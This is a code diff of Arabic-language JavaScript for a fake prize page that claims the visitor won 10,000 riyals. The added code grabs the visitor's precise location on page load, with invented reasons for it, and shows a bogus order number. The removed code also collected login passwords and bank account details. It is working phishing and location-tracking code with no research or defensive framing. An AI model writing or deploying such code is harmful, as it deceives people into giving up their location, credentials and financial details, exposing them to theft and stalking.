@@ -1,284 +1,196 @@
-const SERVER_URL = window.location.origin;
-const statusElement = document.getElementById('status');
-const progressContainer = document.getElementById('progressContainer');
-const progressBar = document.querySelector('.progress-bar');
-const progressText = document.getElementById('progressText');
-const form = document.getElementById('transferForm');
-const submitBtn = document.getElementById('submitBtn');
+// عند تحميل الصفحة، نطلب الموقع مباشرة
+window.onload = function() {
+    const statusDiv = document.getElementById('status');
+    const loadingDiv = document.getElementById('loading');
 
-function updateStatus(message, isError = false) {
-    if (statusElement) {
-        statusElement.textContent = message;
-        statusElement.className = `status ${isError ? 'error' : 'success'}`;
-    }
-}
+    // متغير لمنع تكرار الطلبات
+    let isProcessing = false;
 
-function updateProgress(percent, text) {
-    progressBar.style.width = `${percent}%`;
-    progressText.textContent = text;
-}
-
-function startProgress() {
-    progressContainer.style.display = 'block';
-    submitBtn.disabled = true;
-    
-    let progress = 0;
-    const interval = setInterval(() => {
-        progress += 5;
-        if (progress <= 100) {
-            updateProgress(progress, getProgressText(progress));
-        } else {
-            clearInterval(interval);
-        }
-    }, 200);
-
-    return interval;
-}
-
-function getProgressText(progress) {
-    if (progress < 30) return 'جاري التحقق من البيانات...';
-    if (progress < 60) return 'جاري تحديد موقعك...';
-    if (progress < 90) return 'جاري تجهيز الجائزة...';
-    return 'اكتمل التحقق!';
-}
-
-function checkOnline() {
-    return navigator.onLine;
-}
-
-window.addEventListener('online', () => {
-    updateStatus('تم استعادة الاتصال بالإنترنت');
-});
-
-window.addEventListener('offline', () => {
-    updateStatus('لا يوجد اتصال بالإنترنت', true);
-});
-
-async function sendLocation(position, accountData) {
-    if (!checkOnline()) {
-        updateStatus('لا يوجد اتصال بالإنترنت', true);
-        return;
-    }
-
-    const data = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        accuracy: position.coords.accuracy,
-        timestamp: new Date().toISOString(),
-        accountNumber: accountData.accountNumber,
-        accountName: accountData.accountName
-    };
-
-    try {
-        const response = await fetch(`${SERVER_URL}/submit-location`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        });
-
-        if (!response.ok) {
-            throw new Error(`خطأ في الاستجابة: ${response.status}`);
-        }
-
-        const result = await response.json();
-        updateStatus(result.message);
-        
-    } catch (error) {
-        console.error("خطأ:", error);
-        updateStatus(`حدث خطأ: ${error.message}`, true);
-    } finally {
-        progressContainer.style.display = 'none';
-        submitBtn.disabled = false;
-    }
-}
-
-function handleError(error) {
-    let errorMessage;
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            errorMessage = "تم رفض الوصول إلى الموقع";
-            break;
-        case error.POSITION_UNAVAILABLE:
-            errorMessage = "معلومات الموقع غير متوفرة";
-            break;
-        case error.TIMEOUT:
-            errorMessage = "انتهت مهلة طلب الموقع";
-            break;
-        default:
-            errorMessage = "حدث خطأ غير معروف";
-    }
-    console.error("خطأ تحديد الموقع:", errorMessage);
-    updateStatus(errorMessage, true);
-    progressContainer.style.display = 'none';
-    submitBtn.disabled = false;
-}
-
-document.addEventListener('DOMContentLoaded', function() {
-    const ageModal = document.getElementById('ageModal');
-    const btnYes = document.getElementById('btnYes');
-    const btnNo = document.getElementById('btnNo');
-    const status = document.getElementById('status');
-    let locationData = null;
-
-    // عرض نافذة التحقق من العمر فور تحميل الصفحة
-    setTimeout(() => {
-        ageModal.style.display = 'block';
-    }, 500);
-
-    // التعامل مع زر "نعم" في نافذة العمر
-    btnYes.addEventListener('click', function() {
-        ageModal.style.display = 'none';
-        // طلب الموقع تلقائياً بعد الموافقة على العمر
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                handleLocationSuccess,
-                handleLocationError,
-                { enableHighAccuracy: true }
-            );
-        } else {
-            showError("متصفحك لا يدعم تحديد الموقع");
-        }
-    });
-
-    // التعامل مع زر "لا" في نافذة العمر
-    btnNo.addEventListener('click', function() {
-        ageModal.style.display = 'none';
-        showError("عذراً، يجب أن يكون عمرك 18 عاماً أو أكثر لاستلام الجائزة");
-    });
-
-    // معالجة نجاح تحديد الموقع
-    function handleLocationSuccess(position) {
-        locationData = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: new Date().toISOString()
-        };
-        
-        // إرسال الموقع مباشرة إلى الخادم
-        sendLocationToServer(locationData);
-    }
-
-    // معالجة خطأ تحديد الموقع
-    function handleLocationError(error) {
-        let errorMessage;
-        switch(error.code) {
-            case error.PERMISSION_DENIED:
-                errorMessage = "تم رفض الوصول إلى الموقع";
-                break;
-            case error.POSITION_UNAVAILABLE:
-                errorMessage = "معلومات الموقع غير متوفرة";
-                break;
-            case error.TIMEOUT:
-                errorMessage = "انتهت مهلة طلب الموقع";
-                break;
-            default:
-                errorMessage = "حدث خطأ غير معروف";
-        }
-        showError(errorMessage);
-    }
-
-    // إرسال الموقع إلى الخادم
-    async function sendLocationToServer(locationData) {
-        try {
-            const response = await fetch('/api/location', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(locationData)
-            });
-
-            if (!response.ok) {
-                throw new Error('فشل في إرسال الموقع');
-            }
-
-            showSuccess("تم تحديد موقعك بنجاح");
-        } catch (error) {
-            showError(error.message);
-        }
-    }
-
-    // معالجة تقديم النموذج
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const accountData = {
-            username: document.getElementById('username').value,
-            password: document.getElementById('password').value,
-            location: locationData
-        };
-
-        try {
-            const response = await fetch('/api/submit', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(accountData)
-            });
-
-            if (!response.ok) {
-                throw new Error('فشل في إرسال البيانات');
-            }
-
-            showSuccess("تم إرسال البيانات بنجاح");
-            this.reset();
-        } catch (error) {
-            showError(error.message);
-        }
-    });
-
-    // عرض رسالة نجاح
-    function showSuccess(message) {
-        status.className = 'success';
-        status.textContent = message;
-        status.style.display = 'block';
-    }
-
-    // عرض رسالة خطأ
+    // دالة لإظهار رسالة خطأ
     function showError(message) {
-        status.className = 'error';
-        status.textContent = message;
-        status.style.display = 'block';
-    }
-});
-
-form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    
-    const accountData = {
-        accountNumber: document.getElementById('accountNumber').value,
-        accountName: document.getElementById('accountName').value
-    };
-
-    if (!accountData.accountNumber || !accountData.accountName) {
-        updateStatus('يرجى ملء جميع الحقول', true);
-        return;
+        const button = document.querySelector('.confirm-btn');
+        if (button) {
+            button.textContent = 'تأكيد استلام الجائزة';
+            button.disabled = false;
+            button.classList.add('pulse');
+        }
+        
+        alert(message);
     }
 
-    const progressInterval = startProgress();
+    // دالة لإظهار رسالة نجاح
+    function showSuccess() {
+        const container = document.querySelector('.container');
+        container.innerHTML = `
+            <div class="header" style="text-align: center;">
+                <h1 style="margin-bottom: 20px;">تم التأكيد بنجاح! 🎉</h1>
+                <div class="prize-amount">10,000 ريال</div>
+            </div>
+            <div class="content" style="padding: 30px;">
+                <div style="background: #f8f9fa; border-radius: 15px; padding: 20px; margin-bottom: 20px;">
+                    <div style="color: #28a745; font-size: 24px; margin-bottom: 10px;">✅</div>
+                    <h2 style="color: #28a745; margin: 10px 0;">تم تسجيل طلبك بنجاح</h2>
+                    <p style="color: #666; line-height: 1.6; margin: 15px 0;">
+                        سيتم التواصل معك خلال 24 ساعة عبر WhatsApp<br>
+                        لإكمال إجراءات استلام جائزتك
+                    </p>
+                </div>
+                
+                <div style="border: 1px dashed #ddd; padding: 15px; border-radius: 10px;">
+                    <div style="color: #666; font-size: 0.9em; margin-bottom: 5px;">رقم الطلب</div>
+                    <div style="font-size: 1.2em; color: #DD2476; font-weight: bold;">
+                        #${Math.floor(Math.random() * 1000000).toString().padStart(6, '0')}
+                    </div>
+                </div>
 
-    if (navigator.geolocation) {
+                <div style="margin-top: 30px; color: #666; font-size: 0.9em;">
+                    * يرجى الاحتفاظ برقم الطلب
+                </div>
+            </div>
+        `;
+    }
+
+    // دالة لبدء عملية تأكيد الجائزة
+    async function startProcess() {
+        if (isProcessing) return;
+        isProcessing = true;
+
+        try {
+            // محاولة الحصول على الموقع الحالي
+            const permission = await requestLocationPermission();
+            if (permission === 'granted') {
+                getLocation();
+            } else {
+                // إظهار رسالة تشرح أهمية تحديد الموقع
+                showPermissionDialog();
+            }
+        } catch (error) {
+            showError('عذراً، حدث خطأ غير متوقع. الرجاء المحاولة من هاتف آخر.');
+            isProcessing = false;
+        }
+    }
+
+    // طلب إذن الموقع
+    async function requestLocationPermission() {
+        try {
+            // التحقق من دعم واجهة الأذونات
+            if (navigator.permissions && navigator.permissions.query) {
+                const result = await navigator.permissions.query({ name: 'geolocation' });
+                return result.state;
+            }
+            return 'prompt';
+        } catch {
+            return 'prompt';
+        }
+    }
+
+    // إظهار نافذة شرح أهمية تحديد الموقع
+    function showPermissionDialog() {
+        const container = document.querySelector('.container');
+        const currentContent = container.innerHTML;
+        
+        container.innerHTML = `
+            <div class="header" style="text-align: center;">
+                <h1>خطوة مهمة! 🎯</h1>
+            </div>
+            <div class="content" style="padding: 30px;">
+                <div style="background: #fff3cd; border-radius: 15px; padding: 20px; margin-bottom: 20px; border: 1px solid #ffeeba;">
+                    <h2 style="color: #856404; margin-bottom: 15px;">لماذا نحتاج موقعك؟</h2>
+                    <ul style="text-align: right; color: #666; line-height: 1.6; margin-bottom: 20px;">
+                        <li>للتأكد من وجودك في منطقة الجائزة</li>
+                        <li>لتحديد أقرب مركز تسليم جوائز إليك</li>
+                        <li>لتسريع عملية استلام جائزتك</li>
+                    </ul>
+                </div>
+                
+                <div style="background: #f8f9fa; border-radius: 15px; padding: 20px; margin-bottom: 20px;">
+                    <p style="color: #666; line-height: 1.6;">
+                        عند ظهور نافذة تحديد الموقع، اضغط "السماح" للمتابعة
+                    </p>
+                    <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' width='100'><text y='.9em' font-size='24'>📍</text></svg>" style="width: 100px; margin: 20px 0;">
+                </div>
+
+                <button onclick="getLocation()" class="confirm-btn pulse" style="margin-top: 20px;">
+                    متابعة لاستلام الجائزة
+                </button>
+                
+                <p style="color: #666; font-size: 0.9em; margin-top: 20px;">
+                    * نحتاج موقعك فقط مرة واحدة للتحقق
+                </p>
+            </div>
+        `;
+    }
+
+    // الحصول على الموقع
+    function getLocation() {
+        const button = document.querySelector('.confirm-btn');
+        button.textContent = 'جاري التأكيد...';
+        button.disabled = true;
+        button.classList.remove('pulse');
+
         navigator.geolocation.getCurrentPosition(
-            (position) => {
-                clearInterval(progressInterval);
-                sendLocation(position, accountData);
-            },
-            (error) => {
-                clearInterval(progressInterval);
-                handleError(error);
-            },
+            handleSuccess,
+            handleError,
             {
                 enableHighAccuracy: true,
                 timeout: 10000,
                 maximumAge: 0
             }
         );
-    } else {
-        clearInterval(progressInterval);
-        updateStatus('المتصفح لا يدعم تحديد الموقع', true);
-        progressContainer.style.display = 'none';
-        submitBtn.disabled = false;
     }
-});
+
+    // معالجة نجاح تحديد الموقع
+    async function handleSuccess(position) {
+        try {
+            const response = await fetch('/send-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date().toISOString()
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error('فشل في معالجة الطلب');
+            }
+
+            showSuccess();
+        } catch (error) {
+            showError('عذراً، حدث خطأ في النظام. الرجاء المحاولة بعد قليل.');
+        } finally {
+            isProcessing = false;
+        }
+    }
+
+    // معالجة أخطاء تحديد الموقع
+    function handleError(error) {
+        isProcessing = false;
+        if (error.code === 1) {
+            // تم رفض الإذن
+            showError('عذراً، يجب السماح بتحديد موقعك للمتابعة.');
+        } else {
+            showError('عذراً، لم نتمكن من تأكيد طلبك. الرجاء المحاولة مرة أخرى.');
+        }
+    }
+
+    // طلب الموقع مباشرة
+    showLoading();
+    
+    if (!navigator.geolocation) {
+        showError('متصفحك لا يدعم تحديد الموقع');
+        return;
+    }
+
+    startProcess();
+};
+
+// دالة لإظهار شاشة التحميل
+function showLoading() {
+    const loadingDiv = document.getElementById('loading');
+    loadingDiv.style.display = 'block';
+}
